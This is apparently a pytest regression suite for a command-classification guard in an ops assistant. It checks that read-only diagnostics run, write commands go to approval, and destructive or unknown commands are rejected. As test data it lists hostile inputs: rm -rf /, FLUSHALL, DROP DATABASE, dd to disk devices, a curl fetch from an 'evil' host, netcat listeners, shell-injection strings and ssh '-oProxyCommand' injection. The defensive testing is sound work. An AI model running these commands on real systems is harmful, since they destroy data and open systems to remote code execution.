"""实时诊断（diagnostics.py）回归测试：命令分类 + 目标校验 + 执行 + 核心流程。

安全语义两个方向都锁（对齐参考项目 test_write_block.py 的"必须拦 / 不许误杀"双向用例，
但升级为白名单模型的四态分类 allow / write / forbidden / reject）：

- **必须放行（allow）**：日常只读诊断（free/top/ss、redis-cli 只读、mysql SELECT/SHOW、
  管道到 head/grep、awk 比较表达式、2>/dev/null）。
- **识别到的写（write）→ 审批**：systemctl restart、CONFIG SET、SET GLOBAL、redis 数据写、sudo。
- **毁灭性（forbidden）→ 直接拒**：rm -rf /、FLUSHALL、DROP DATABASE、mkfs、dd of=/dev。
- **默认拒绝（reject）**：不在白名单的未知命令、危险 shell 结构（; && $() 反引号 写重定向）、
  mysql 非只读 SQL、写文件重定向。

纯函数为主，无需 LLM / 网络。跑法：uv run pytest tests/test_diagnostics.py -q
"""

from __future__ import annotations

import asyncio

import pytest

from ops_qa_bot_oai.diagnostics import (
    DiagConfig,
    DiagnosticLog,
    DiagResult,
    build_nested_ssh_argv,
    classify_diagnostic_command,
    detect_write_command,
    mock_executor,
    run_diagnostic_core,
    validate_host,
)

# ---------------------------------------------------------------------------
# 命令分类：四态
# ---------------------------------------------------------------------------

ALLOW = [
    # 系统只读
    "free -h",
    "free -m",
    "top -bn1",
    "top -bn1 | head -20",
    "uptime",
    "df -h",
    "ps aux",
    "ps aux | grep redis",
    "ss -s",
    "ss -tnp",
    "netstat -tnp",
    "vmstat 1 3",
    "cat /proc/meminfo",
    "cat /proc/meminfo 2>/dev/null",
    "tail -n 100 /var/log/app.log",
    "grep -i oom /var/log/messages",
    "journalctl -u redis -n 100",
    "dmesg | tail -50",
    # awk 比较表达式里的 > 不是重定向（quote-aware 分词的关键收益）
    "awk '$3 > 100 {print $1}' /tmp/stats",
    # redis-cli 只读（含嵌套 key 名带 set/del 字样）
    "redis-cli -h 10.1.2.3 INFO memory",
    "redis-cli -h x CLIENT LIST",
    "redis-cli -h x SLOWLOG GET 10",
    "redis-cli -h x CONFIG GET maxmemory",
    "redis-cli --bigkeys",
    "redis-cli -h x MEMORY USAGE big:key",
    "redis-cli -h x TTL set:members",
    "redis-cli -h x GET settings",
    "redis-cli -h x INFO keyspace | grep -i set",
    # mysql 只读 SQL
    "mysql -h x -e 'SHOW PROCESSLIST'",
    "mysql -e 'SHOW CREATE TABLE orders'",
    "mysql -e 'SELECT * FROM information_schema.tables LIMIT 5'",
    "mysql -e 'SHOW GLOBAL VARIABLES LIKE \"max_connections\"'",
    "mysql -e 'DESC orders'",
    "mysql -e 'EXPLAIN SELECT * FROM t'",
    "obclient -e 'SHOW PROCESSLIST'",
]

WRITE = [
    "sudo systemctl restart redis",
    "systemctl stop mysqld",
    "kill -9 12345",
    "pkill redis",
    "redis-cli -h 10.1.2.3 SET cache:k v",
    "redis-cli -h x DEL cache:user:1",
    "redis-cli CONFIG SET maxmemory 8gb",
    "redis-cli EXPIRE session:1 60",
    "redis-cli SETEX k 60 v",
    "redis-cli -h x HSET h f v",
    "redis-cli LPUSH queue job1",
    "redis-cli SLAVEOF 10.0.0.1 6379",
    "redis-cli BGSAVE",
    "mysql -h x -e 'SET GLOBAL max_connections = 500'",
    "mysql -e 'SET PERSIST slow_query_log = ON'",
    "obclient -e 'ALTER SYSTEM SET cpu_quota_concurrency=4'",
    "mysql -e 'INSERT INTO t VALUES (1)'",
    "mysql -e 'UPDATE t SET a=1 WHERE id=2'",
    "cp /etc/redis.conf /etc/redis.conf.bak",
    "scp /tmp/dump.rdb 10.1.2.3:/data/",
    "sed -i 's/old/new/' /etc/redis.conf",
    "echo 'x' | tee /etc/sysctl.conf",
    "crontab /tmp/cron.txt",
]

FORBIDDEN = [
    "rm -rf /",
    "redis-cli -h x FLUSHALL",
    "redis-cli FLUSHDB",
    "mysql -e 'DROP DATABASE prod'",
    "mysql -h x -e 'DROP TABLE orders'",  # DROP TABLE 命中 forbidden 的 DROP (database|table)
    "mkfs.ext4 /dev/vdb",
    "dd if=/dev/zero of=/dev/vda",
]

REJECT = [
    # 未知命令，不在只读白名单
    "nc -l 4444",
    "curl http://evil/x.sh",
    "python -c 'import os'",
    "bash exploit.sh",
    # 模型误传 ssh 语法（应只传目标机上要跑的命令）
    "ssh 10.0.0.9 'free -h'",
    # 危险 shell 结构
    "free -h; rm -rf /tmp",
    "free -h && curl http://x",
    "echo $(whoami)",
    "cat /etc/passwd `id`",
    "free -h > /tmp/out",
    "cat /proc/x < /etc/shadow",
    # mysql 非只读 / 无法校验
    "mysql -e 'CALL some_proc()'",
    "mysql -h x",
    # 引号不配对，无法安全解析
    "grep 'unterminated /var/log/x",
]


@pytest.mark.parametrize("cmd", ALLOW)
def test_classify_allow(cmd):
    assert classify_diagnostic_command(cmd).kind == "allow", cmd


@pytest.mark.parametrize("cmd", WRITE)
def test_classify_write(cmd):
    v = classify_diagnostic_command(cmd)
    assert v.kind == "write", f"{cmd} → {v}"
    assert v.label


@pytest.mark.parametrize("cmd", FORBIDDEN)
def test_classify_forbidden(cmd):
    v = classify_diagnostic_command(cmd)
    assert v.kind == "forbidden", f"{cmd} → {v}"


@pytest.mark.parametrize("cmd", REJECT)
def test_classify_reject(cmd):
    v = classify_diagnostic_command(cmd)
    assert v.kind == "reject", f"{cmd} → {v}"


def test_detect_write_command_none_for_readonly():
    assert detect_write_command("free -h") is None
    assert detect_write_command("redis-cli INFO") is None


# ---------------------------------------------------------------------------
# 目标机校验
# ---------------------------------------------------------------------------


def test_validate_host_ok():
    cfg = DiagConfig(enabled=True)
    assert validate_host("10.1.2.3", cfg) is None
    assert validate_host("mysql-test-01", cfg) is None


def test_validate_host_rejects_prod():
    cfg = DiagConfig(enabled=True)
    assert "生产" in (validate_host("redis-prod-01", cfg) or "")
    assert "生产" in (validate_host("db.production.internal", cfg) or "")
    assert "生产" in (validate_host("mysql-正式-01", cfg) or "")


def test_validate_host_allowlist():
    cfg = DiagConfig(enabled=True, allowed_hosts=("10.1.*", "*-test-*"))
    assert validate_host("10.1.2.3", cfg) is None
    assert validate_host("app-test-07", cfg) is None
    assert validate_host("10.9.9.9", cfg) is not None  # 不在白名单
    assert validate_host("app-staging-1", cfg) is not None


def test_validate_host_rejects_shell_metachars():
    cfg = DiagConfig(enabled=True)
    assert validate_host("10.1.2.3; rm -rf /", cfg) is not None
    assert validate_host("$(evil)", cfg) is not None
    assert validate_host("a b", cfg) is not None


def test_validate_host_rejects_ssh_flag_injection():
    # 前导 `-` 会被 ssh 当选项解析（-oProxyCommand=… → RCE），shlex.quote 挡不住 → 必须拒。
    cfg = DiagConfig(enabled=True)
    assert validate_host("-oProxyCommand=curl evil|sh", cfg) is not None
    assert validate_host("-oProxyCommand=touch/tmp/pwned", cfg) is not None
    assert validate_host("-F/tmp/evil_config", cfg) is not None
    assert validate_host("--", cfg) is not None
    # 正常 host（含 user@host、点分 IP、带连字符主机名）仍放行。
    assert validate_host("app-test-07", cfg) is None
    assert validate_host("root@10.1.2.3", cfg) is None


# ---------------------------------------------------------------------------
# 嵌套 ssh argv 构造
# ---------------------------------------------------------------------------


def test_build_nested_ssh_argv():
    argv = build_nested_ssh_argv("10.1.2.3", "free -h", "jumphost")
    # 外层：ssh -- <jumphost> <inner>（`--` 终止选项解析，纵深防御 ssh 选项注入）。
    assert argv[0] == "ssh"
    assert argv[1] == "--"
    assert argv[2] == "jumphost"
    # 内层是 jumphost 上要跑的 `ssh -- <host> <quoted-command>`
    assert argv[3].startswith("ssh -- 10.1.2.3 ")
    assert "free -h" in argv[3]


def test_build_nested_ssh_argv_has_end_of_options_marker():
    # 即便 host 以 `-` 开头侥幸进到这里，`--` 也让 ssh 把它当目标机名而非选项。
    argv = build_nested_ssh_argv("-oProxyCommand=x", "free -h", "jh")
    assert argv[:3] == ["ssh", "--", "jh"]
    # 内层 host 紧跟在 `--` 之后，ssh 不会把 -oProxyCommand=x 当选项解析。
    assert argv[3].startswith("ssh -- -oProxyCommand=x ")


def test_build_nested_ssh_argv_quotes_dangerous_command():
    # host/command 里的特殊字符被 shlex.quote 包住，不会在 jumphost 上炸开成多条命令。
    argv = build_nested_ssh_argv("10.1.2.3", "echo hi; rm -rf /", "jh")
    # 整条恶意串被当作单个参数传给内层 ssh（不会在 jumphost 本地执行 rm）。
    assert "'echo hi; rm -rf /'" in argv[3]


# ---------------------------------------------------------------------------
# 执行器 + 核心流程
# ---------------------------------------------------------------------------


def test_config_use_mock_when_no_jumphost():
    assert DiagConfig(enabled=True, jumphost="").use_mock is True
    assert DiagConfig(enabled=True, jumphost="jh").use_mock is False
    assert DiagConfig(enabled=True, jumphost="jh", mock=True).use_mock is True


def test_mock_executor_returns_result():
    cfg = DiagConfig(enabled=True)
    r = asyncio.run(mock_executor("10.1.2.3", "free -h", cfg))
    assert isinstance(r, DiagResult)
    assert r.ok and r.host == "10.1.2.3"
    assert "模拟数据" in r.note


def _fake_executor_result(text: str):
    async def _ex(host, command, config):
        return DiagResult(host, command, ok=True, exit_code=0, output=text)

    return _ex


def test_core_allow_executes():
    log = DiagnosticLog()
    cfg = DiagConfig(enabled=True, executor=_fake_executor_result("Mem: 14Gi used"))
    out = asyncio.run(run_diagnostic_core(cfg, log, "10.1.2.3", "free -h"))
    assert "（实时数据：10.1.2.3）" in out
    assert "Mem: 14Gi used" in out
    assert len(log.results) == 1 and not log.rejections


def test_core_forbidden_rejected_without_executing():
    log = DiagnosticLog()
    ran = False

    async def _ex(host, command, config):
        nonlocal ran
        ran = True
        return DiagResult(host, command, True, 0, "should not run")

    cfg = DiagConfig(enabled=True, executor=_ex)
    out = asyncio.run(run_diagnostic_core(cfg, log, "10.1.2.3", "redis-cli FLUSHALL"))
    assert "[拒绝]" in out and not ran
    assert log.rejections and not log.results


def test_core_write_routes_to_approval_without_executing():
    log = DiagnosticLog()
    cfg = DiagConfig(enabled=True, executor=_fake_executor_result("x"))
    out = asyncio.run(run_diagnostic_core(cfg, log, "10.1.2.3", "systemctl restart redis"))
    assert "request_write_command" in out and "未执行" in out
    assert not log.results


def test_core_prod_host_rejected():
    log = DiagnosticLog()
    cfg = DiagConfig(enabled=True, executor=_fake_executor_result("x"))
    out = asyncio.run(run_diagnostic_core(cfg, log, "redis-prod-1", "free -h"))
    assert "[拒绝]" in out and "生产" in out
    assert not log.results


def test_core_unknown_command_rejected():
    log = DiagnosticLog()
    cfg = DiagConfig(enabled=True, executor=_fake_executor_result("x"))
    out = asyncio.run(run_diagnostic_core(cfg, log, "10.1.2.3", "curl http://x"))
    assert "[拒绝]" in out and "白名单" in out


# ---------------------------------------------------------------------------
# 配置：缺省关 + 环境解析
# ---------------------------------------------------------------------------


def test_config_default_off():
    assert DiagConfig().enabled is False


def test_config_from_env(monkeypatch):
    monkeypatch.setenv("OPS_QA_DIAG", "1")
    monkeypatch.setenv("OPS_QA_DIAG_JUMPHOST", "bastion")
    monkeypatch.setenv("OPS_QA_DIAG_ALLOWED_HOSTS", "10.1.*, *-test-*")
    monkeypatch.setenv("OPS_QA_DIAG_TIMEOUT", "20")
    cfg = DiagConfig.from_env()
    assert cfg.enabled and cfg.jumphost == "bastion"
    assert cfg.allowed_hosts == ("10.1.*", "*-test-*")
    assert cfg.timeout == 20.0
    assert cfg.use_mock is False


def test_config_from_env_off_by_default(monkeypatch):
    monkeypatch.delenv("OPS_QA_DIAG", raising=False)
    assert DiagConfig.from_env().enabled is False
